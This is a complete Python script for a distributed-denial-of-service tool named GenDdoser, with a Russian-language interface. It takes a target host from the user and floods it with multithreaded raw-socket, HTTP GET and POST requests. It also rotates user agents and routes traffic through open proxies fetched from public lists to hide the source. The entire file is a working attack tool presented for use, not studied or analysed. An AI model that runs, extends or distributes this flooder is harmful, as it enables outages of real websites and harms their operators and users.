#!/usr/bin/python3

import socket
import threading
import time
import random
import requests
import urllib3
import datetime

urllib3.disable_warnings()

class GenDdoser:
    def __init__(self):
        self.uagent = []
        self.proxies = []
        self.host = ""
        self.port = 80
        self.thr = 1000
        self.active = False
        self.proxy_enabled = False
        self.attack_count = 0
        self.init_user_agents()
        
    def init_user_agents(self):
        self.uagent = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.1; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (X11; Linux i686; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        ]

    def load_proxies(self):
        proxy_sources = [
            'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
            'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http'
        ]
        
        for source in proxy_sources:
            try:
                response = requests.get(source, timeout=10)
                self.proxies.extend([p.strip() for p in response.text.split('\n') if p.strip()])
            except:
                continue
        
        self.proxies = list(set(self.proxies))
        return len(self.proxies)

    def get_target(self):
        print("GenDdoser 0.1 beta")
        target = input("Введите IP/URL цели: ").strip()
        
        if target.startswith('http://'):
            target = target[7:]
        elif target.startswith('https://'):
            target = target[8:]
        
        if '/' in target:
            target = target.split('/')[0]
        
        self.host = target
        
        port_input = input("Введите порт (по умолчанию 80): ").strip()
        self.port = int(port_input) if port_input else 80
        
        threads_input = input("Введите количество потоков (по умолчанию 1000): ").strip()
        self.thr = int(threads_input) if threads_input else 1000
        
        proxy_choice = input("Использовать прокси? (y/n): ").strip().lower()
        if proxy_choice == 'y':
            self.proxy_enabled = True
            print("Загрузка прокси...")
            loaded = self.load_proxies()
            print(f"Загружено прокси: {loaded}")
        
        print(f"Цель: {self.host}:{self.port}")
        print(f"Потоки: {self.thr}")
        print("Запуск через 3 секунды...")
        time.sleep(3)

    def get_random_proxy(self):
        if not self.proxies or not self.proxy_enabled:
            return None
        return random.choice(self.proxies)

    def create_socket_attack(self):
        try:
            current_time = datetime.datetime.now().strftime("%H:%M:%S")
            proxy = self.get_random_proxy()
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            
            if proxy:
                try:
                    proxy_host, proxy_port = proxy.split(':')
                    s.connect((proxy_host, int(proxy_port)))
                    print(f"\033[94m[{current_time}] Пакет отправлен через прокси {proxy}\033[0m")
                except:
                    s.connect((self.host, self.port))
                    print(f"\033[93m[{current_time}] Пакет отправлен напрямую\033[0m")
            else:
                s.connect((self.host, self.port))
                print(f"\033[93m[{current_time}] Пакет отправлен напрямую\033[0m")
            
            payload = f"GET / HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: {random.choice(self.uagent)}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n".encode()
            
            for _ in range(10):
                s.send(payload)
            s.close()
            self.attack_count += 1
        except Exception as e:
            print(f"\033[91m[{datetime.datetime.now().strftime('%H:%M:%S')}] Ошибка сокета: {e}\033[0m")

    def create_http_attack(self):
        try:
            current_time = datetime.datetime.now().strftime("%H:%M:%S")
            proxy = self.get_random_proxy()
            url = f"http://{self.host}:{self.port}/"
            headers = {'User-Agent': random.choice(self.uagent)}
            
            if proxy:
                proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
                requests.get(url, headers=headers, proxies=proxies, timeout=3, verify=False)
                print(f"\033[92m[{current_time}] HTTP запрос отправлен через прокси {proxy}\033[0m")
            else:
                requests.get(url, headers=headers, timeout=3, verify=False)
                print(f"\033[93m[{current_time}] HTTP запрос отправлен напрямую\033[0m")
                
            self.attack_count += 1
        except Exception as e:
            print(f"\033[91m[{datetime.datetime.now().strftime('%H:%M:%S')}] Ошибка HTTP: {e}\033[0m")

    def create_post_attack(self):
        try:
            current_time = datetime.datetime.now().strftime("%H:%M:%S")
            proxy = self.get_random_proxy()
            url = f"http://{self.host}:{self.port}/"
            headers = {'User-Agent': random.choice(self.uagent)}
            data = {'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=1000))}
            
            if proxy:
                proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
                requests.post(url, headers=headers, data=data, proxies=proxies, timeout=3, verify=False)
                print(f"\033[95m[{current_time}] POST запрос отправлен через прокси {proxy}\033[0m")
            else:
                requests.post(url, headers=headers, data=data, timeout=3, verify=False)
                print(f"\033[93m[{current_time}] POST запрос отправлен напрямую\033[0m")
                
            self.attack_count += 1
        except Exception as e:
            print(f"\033[91m[{datetime.datetime.now().strftime('%H:%M:%S')}] Ошибка POST: {e}\033[0m")

    def socket_worker(self):
        while self.active:
            self.create_socket_attack()

    def http_worker(self):
        while self.active:
            self.create_http_attack()

    def post_worker(self):
        while self.active:
            self.create_post_attack()

    def start_attack(self):
        self.active = True
        self.attack_count = 0
        
        socket_threads = int(self.thr * 0.5)
        http_threads = int(self.thr * 0.3)
        post_threads = int(self.thr * 0.2)
        
        print(f"Запуск {socket_threads} сокет потоков...")
        for _ in range(socket_threads):
            t = threading.Thread(target=self.socket_worker)
            t.daemon = True
            t.start()
        
        print(f"Запуск {http_threads} HTTP потоков...")
        for _ in range(http_threads):
            t = threading.Thread(target=self.http_worker)
            t.daemon = True
            t.start()
        
        print(f"Запуск {post_threads} POST потоков...")
        for _ in range(post_threads):
            t = threading.Thread(target=self.post_worker)
            t.daemon = True
            t.start()
        
        print("Атака запущена!")
        print("Для остановки нажмите Ctrl+C")
        
        start_time = time.time()
        last_count = 0
        
        try:
            while self.active:
                time.sleep(1)
                current_time = time.time()
                elapsed = current_time - start_time
                
                if elapsed >= 5:
                    rate = (self.attack_count - last_count) / 5
                    print(f"\033[96mСтатистика | Всего запросов: {self.attack_count} | Скорость: {rate:.1f} запр/сек\033[0m")
                    last_count = self.attack_count
                    start_time = current_time
                    
        except KeyboardInterrupt:
            self.stop_attack()

    def stop_attack(self):
        print("\nОстановка атаки...")
        self.active = False
        time.sleep(2)
        print(f"Всего отправлено запросов: {self.attack_count}")

    def run(self):
        try:
            self.get_target()
            self.start_attack()
        except Exception as e:
            print(f"Ошибка: {e}")

if __name__ == "__main__":
    ddoser = GenDdoser()
    ddoser.run()
